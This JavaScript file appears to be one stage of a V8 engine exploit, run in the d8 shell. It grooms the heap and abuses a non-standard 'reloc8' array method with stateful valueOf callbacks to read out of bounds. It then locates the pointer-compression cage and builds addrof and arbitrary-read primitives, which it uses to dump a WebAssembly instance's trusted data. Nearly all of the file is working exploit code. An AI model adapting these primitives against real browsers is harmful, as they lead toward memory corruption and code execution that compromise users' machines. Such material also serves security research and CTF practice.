// t4.js — t3 + WasmTrustedInstanceData dump + keep process alive for /proc maps check
// local dev run: ./d8 --allow-natives-syntax t4.js

// ===== pre-groom =====
const wbytes = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
  0x03,0x02,0x01,0x00,
  0x07,0x05,0x01,0x01,0x66,0x00,0x00,
  0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b
]);
const wmod  = new WebAssembly.Module(wbytes);
const winst = new WebAssembly.Instance(wmod);
const wf    = winst.exports.f;

const cvBuf   = new ArrayBuffer(8);
const cvF     = new Float64Array(cvBuf);
const cvU     = new Uint32Array(cvBuf);
const NSCAN   = 512;
const scanBuf = new ArrayBuffer(8 * NSCAN);
const scanF   = new Float64Array(scanBuf);
const dumpU   = new Uint32Array(256);

const fromArg = { n: 0, v: 0,
  valueOf() { this.n++; if (this.n === 1) return 0; this.n = 0; return this.v; } };
const toArg   = { n: 0, v: 0,
  valueOf() { this.n++; if (this.n === 1) return 0; this.n = 0; return this.v; } };

// ===== groom =====
const arr   = new Array(100).fill(1.1);
const ta    = new Float64Array(0x1337);
const probe = new Uint8Array(16);
const oarr  = [{}];
const rw    = [1.1];

// ===== scan =====
for (let k = 0; k < NSCAN; k++) {
  fromArg.n = 0; toArg.n = 0;
  fromArg.v = k; toArg.v = 0;
  arr.reloc8(fromArg, toArg);
  scanF[k] = arr[0];
}
function lo(k) { cvF[0] = scanF[k]; return cvU[0]; }
function hi(k) { cvF[0] = scanF[k]; return cvU[1]; }

let taLenIdx = -1;
for (let k = 4; k < NSCAN - 4; k++)
  if (lo(k) === 0x99b8 && hi(k) === 0 && lo(k-1) === 0 && hi(k-1) === 0 &&
      (lo(k+2) !== 0 || hi(k+2) !== 0)) { taLenIdx = k; break; }
const taExtIdx = taLenIdx + 2;

let cageWordIdx = -1;
for (let j = taLenIdx + 1; j < NSCAN - 1; j++)
  if (lo(j-1) === 0x11 && hi(j-1) === 7) { cageWordIdx = j; break; }
const cageHi = cageWordIdx >= 0 ? lo(cageWordIdx) : 0;

let oarrElemIdx = -1, oarrAligned = true;
for (let c = cageWordIdx; c < NSCAN - 2; c++) {
  if (lo(c) === 0x5dd && hi(c) === 2) { oarrElemIdx = c; oarrAligned = true; break; }
  if (hi(c) === 0x5dd && lo(c+1) === 2) { oarrElemIdx = c; oarrAligned = false; break; }
}
const oarrContentIdx = oarrElemIdx + 1;

let rwIdx = -1;
for (let m = oarrElemIdx; m < NSCAN; m++)
  if (lo(m) === 0x9999999a && hi(m) === 0x3ff19999 && hi(m-1) === 2) { rwIdx = m; break; }

// ===== primitives =====
function addrofComp(o) {
  oarr[0] = o;
  fromArg.n = 0; toArg.n = 0;
  fromArg.v = oarrContentIdx; toArg.v = 0;
  arr.reloc8(fromArg, toArg);
  cvF[0] = arr[0];
  return oarrAligned ? cvU[0] : cvU[1];
}
function setExt(alo, ahi) {
  cvU[0] = alo; cvU[1] = ahi;
  rw[0] = cvF[0];
  fromArg.n = 0; toArg.n = 0;
  fromArg.v = rwIdx; toArg.v = taExtIdx;
  arr.reloc8(fromArg, toArg);
}
function arbReadInto(alo, ahi, off) {
  setExt(alo, ahi);
  cvF[0] = ta[0];
  dumpU[off] = cvU[0]; dumpU[off+1] = cvU[1];
}

// ===== instance + trusted data walk =====
const instComp = addrofComp(winst);
const instLo = instComp - 1;
arbReadInto(instLo, cageHi, 0);               // word0: map|props
arbReadInto(instLo + 8, cageHi, 2);           // word1: elements|trusted_data
const tdComp = dumpU[3];
const tdUntagged = tdComp - 1;
const tdBase = tdUntagged & 0xfffffff8;       // 8-aligned dump base
for (let w = 0; w < 80; w++) arbReadInto(tdBase + 8*w, cageHi, 2*w);

// ===== output (all reads done; allocations now harmless) =====
function h8(x) { let s = (x >>> 0).toString(16); while (s.length < 8) s = "0" + s; return s; }
console.log("cage=0x" + cageHi.toString(16) + "00000000" +
            " taLenIdx=" + taLenIdx + " taExtIdx=" + taExtIdx +
            " cageWordIdx=" + cageWordIdx + " oarrElemIdx=" + oarrElemIdx +
            " oarrAligned=" + oarrAligned + " rwIdx=" + rwIdx);
console.log("inst=0x" + cageHi.toString(16) + h8(instLo) +
            " trusted_data=0x" + cageHi.toString(16) + h8(tdUntagged) +
            " (dump base 0x" + h8(tdBase) + ")");
for (let w = 0; w < 80; w++)
  console.log("td+" + ((tdBase - tdUntagged) + 8*w) + " = 0x" + h8(dumpU[2*w+1]) + h8(dumpU[2*w]));

// ===== keep process alive so /proc/<pid>/maps can be inspected =====
const t0 = Date.now();
while (Date.now() - t0 < 45000) {}
console.log("done waiting");
